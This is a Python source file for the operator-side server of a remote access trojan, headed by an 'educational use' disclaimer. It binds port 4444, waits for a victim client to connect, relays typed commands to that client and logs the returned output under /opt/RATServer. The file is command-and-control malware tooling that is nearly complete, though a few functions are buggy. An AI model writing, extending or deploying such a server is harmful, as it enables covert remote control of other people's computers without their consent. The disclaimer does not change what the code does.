#This project is solely for educational use. The author does not authorize
#the use of this project for any malicious or illegal actions.

import os
import socket
import time
import sys
from datetime import datetime

#create a socket object for use throughout the program
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#port variable for server to open the port on
port = 4444
host = '127.0.0.1'

#Queue array to hold commands
queue = []

#Variable for the log file name
logFileName = "RAT_Server_log" + str(time.time()) + ".txt"

def help():
    print('='*5, "HELP", '='*5)
    print('Enter "quit" to tell the remote server to end the connection')
    print('Enter "stop" to stop RAT server')
    print('='*16)

def sendCommand(cmd):
    msg = cmd.encode("UTF-8")
    clientaddr.send(msg)
    message = clientaddr.recv(4096)
    print(message.decode("UTF-8"))
    f = open("/opt/RATServer/" + logFileName, "a")
    f.write(message.decode("UTF-8"))

def addCommandtoQueue(cmd):
    queue.insert(cmd)

def clearQueue():
    for i in queue:
        queue.pop()

print("Starting the server...")

try:
    #Open a port on the server and start listening on it
    s.bind((host, port))
    s.listen()
    print("Server started successfully on port", port)
except Exception as e:
    print("The following error has occurred: ", e)
    exit()

print("Awaiting connection from client...")
print("Please wait for connection before issuing commands")

#accept connection from client software
#let the end user know that a successful connection came from the client
try:
    clientaddr = s.accept()[0]
    print("Connection accepted from ", clientaddr)
except Exception as e:
    print("The following error has occurred: ", e)
    exit()

#start accepting commands from the end user
while True:
    #create a unique log file with the help of UNIX time
    #log file will receive all commands sent and their output
    os.system("mkdir -p /opt/RATServer/")

    f = open("/opt/RATServer/" + logFileName, 'a')

    f.write("Log file created on " + str(datetime.now()) + "\n")
    f.write("Your command to send: ")
    command = input("Your command to send: ")
    f.write(command + "\n")

    #if user enters "help", then the server should display a help message
    if command.lower() == 'help':
        help()
    #if the user enters "quit", then the server should kill the remote connection
    elif command.lower() == 'quit':
        f.write("Killing the remote connection\n")
        print("Killing the remote connection")
        sendCommand("quit")
    #if the user enters "stop", the RAT server software should stop running
    elif command.lower() == "stop":
        f.write("Stopping the RAT server software\n")
        print("Stopping the RAT server software")
        print("Log file of session created at /opt/RATServer/" + logFileName)
        f.close()
        exit(0)
    else:
        sendCommand(command)





